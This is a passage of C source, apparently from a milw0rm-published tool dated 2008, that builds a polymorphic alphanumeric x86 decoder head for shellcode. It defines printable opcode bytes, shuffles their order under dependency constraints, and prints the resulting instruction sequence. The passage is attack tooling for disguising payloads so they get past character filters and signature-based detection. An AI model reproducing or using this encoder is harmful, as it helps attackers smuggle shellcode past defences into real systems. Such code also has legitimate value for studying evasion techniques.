    instructions[1][0] = '\x58';         //X
    instructions[2][0] = '\x34';         //4
    instructions[2][1] = xor_al1;        //
    instructions[3][0] = '\x48';         //H
    instructions[4][0] = '\x34';         //4
    instructions[4][1] = jne_xor1;       //
    instructions[5][0] = '\x30';         //0
    instructions[5][1] = '\x42';         //B
    instructions[5][2] = size_decoder-1; //
    instructions[6][0] = '\x52';         //R
    instructions[7][0] = '\x52';         //R
    instructions[8][0] = '\x59';         //Y
    instructions[9][0] = '\x47';         //G
    instructions[10][0] = '\x43';        //C

    strcat(instruction_comments[0], "push XOR_AL1");
    strcat(instruction_comments[1], "pop eax");
    strcat(instruction_comments[2], "xor al, XOR_AL1");
    strcat(instruction_comments[3], "dec eax");
    strcat(instruction_comments[4], "xor al, JNE_XOR1");
    strcat(instruction_comments[5], "xor byte ptr [edx+size], al");
    strcat(instruction_comments[6], "push edx");
    strcat(instruction_comments[7], "push edx");
    strcat(instruction_comments[8], "pop ecx");
    strcat(instruction_comments[9], "inc edi");
    strcat(instruction_comments[10], "inc ebx");
    do {
        memset(p_state, 0, sizeof(UCHAR*)*5);
        random_states = shuffle(states, 11);

        //.*0.*1.*2.*3.*4.*5
        p_state[0] = memchr(random_states, 0, 11);
        if(p_state[0])
            p_state[1] = memchr(p_state[0], 1, 11-(p_state[0]-random_states));
        if(p_state[1])
            p_state[1] = memchr(p_state[1], 2, 11-(p_state[1]-random_states));
        if(p_state[1])
            p_state[1] = memchr(p_state[1], 3, 11-(p_state[1]-random_states));
        if(p_state[1])
            p_state[1] = memchr(p_state[1], 4, 11-(p_state[1]-random_states));
        if(p_state[1])
            p_state[1] = memchr(p_state[1], 5, 11-(p_state[1]-random_states));

         //.*[67].*8
        if(p_state[1])
        {
            p_state[2] = memchr(random_states, 6, 11);
            p_state[3] = memchr(p_state[2], 8, 11-(p_state[2]-random_states));
            if(!p_state[3])
            {
                p_state[2] = memchr(random_states, 7, 11);
                p_state[3] = memchr(p_state[2], 8, 11-(p_state[2]-random_states));
            }
            if(p_state[3])
            {
                //.*1.*[67].*[67]
                if(p_state[2] && p_state[1] < p_state[2])
                    p_state[4] = memchr(p_state[2], *p_state[2]==6?7:6, 11-(p_state[2]-random_states));

                //.*0.*[67].*8.*1
                if(!p_state[4])
                    p_state[4] = memchr(p_state[0], 6, 11-(p_state[0]-random_states));
                if(!p_state[4])
                    p_state[4] = memchr(p_state[0], 7, 11-(p_state[0]-random_states));
                if(p_state[4])
                    p_state[4] = memchr(p_state[4], 8, 11-(p_state[4]-random_states));
                if(p_state[4])
                    p_state[4] = memchr(p_state[4], 1, 11-(p_state[4]-random_states));

                //.*[67].*8.*0.*1.*[67]
                if(!p_state[4])
                    p_state[4] = memchr(p_state[3], 0, 11-(p_state[3]-random_states));
                if(p_state[4])
                    p_state[4] = memchr(p_state[4], 1, 11-(p_state[3]-random_states));
                if(p_state[4])
                    p_state[4] = memchr(p_state[4], *p_state[3]==6?7:6, 11-(p_state[4]-random_states));
            }
        }

    }
    while (!p_state[4]);

    for (c=state=0; state<sizeof(states); state++) {
        i=0;
        while (instructions[random_states[state]][i] && i < 3) {
            output[c] = instructions[random_states[state]][i];
            i++;
            c++;
        }
    }

    printf("======================\ndecoder head instruction order: %x %x %x %x %x %x %x %x %x %x %x\n",
        random_states[0],
        random_states[1],
        random_states[2],
        random_states[3],
        random_states[4],
        random_states[5],
        random_states[6],
        random_states[7],
        random_states[8],
        random_states[9],
        random_states[10]
        );

    printf("%s\n" \
           "%s\n" \
           "%s\n" \
           "%s\n" \
           "%s\n" \
           "%s\n" \
           "%s\n" \
           "%s\n" \
           "%s\n" \
           "%s\n" \
           "%s\n======================\n",
        instruction_comments[random_states[0]],
        instruction_comments[random_states[1]],
        instruction_comments[random_states[2]],
        instruction_comments[random_states[3]],
        instruction_comments[random_states[4]],
        instruction_comments[random_states[5]],
        instruction_comments[random_states[6]],
        instruction_comments[random_states[7]],
        instruction_comments[random_states[8]],
        instruction_comments[random_states[9]],
        instruction_comments[random_states[10]]);

    return output;
}

// milw0rm.com [2008-08-04]